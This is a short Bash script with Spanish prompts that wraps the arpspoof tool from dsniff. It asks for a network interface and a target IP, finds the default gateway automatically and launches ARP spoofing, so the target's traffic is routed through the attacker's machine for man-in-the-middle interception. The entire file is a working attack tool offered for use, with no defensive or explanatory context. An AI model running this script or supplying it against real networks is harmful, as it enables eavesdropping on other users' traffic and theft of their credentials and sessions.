#!/bin/bash

echo ""
echo "Creado por JossueGallardo"
echo ""

# Función para verificar si una herramienta está instalada
check_herramienta() {
    if ! command -v "$1" &> /dev/null; then
        echo "Error: $1 no está instalado. Por favor, instala $1 y vuelve a intentarlo." >&2
        exit 1
    fi
}

check_herramienta "dsniff"

# Pedir datos
read -p "Inserte la interfaz de red que quieras analizar: " interfaz
read -p "Inserta la IP objetivo: " ip

# ✅ Validar formato de IP
if ! [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
    echo "IP inválida. Intenta nuevamente."
    exit 1
fi

# ✅ Detectar puerta de enlace automáticamente
puerta_enlace=$(ip route | grep default | awk '{print $3}')

# Ejecutar spoofing
arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace"

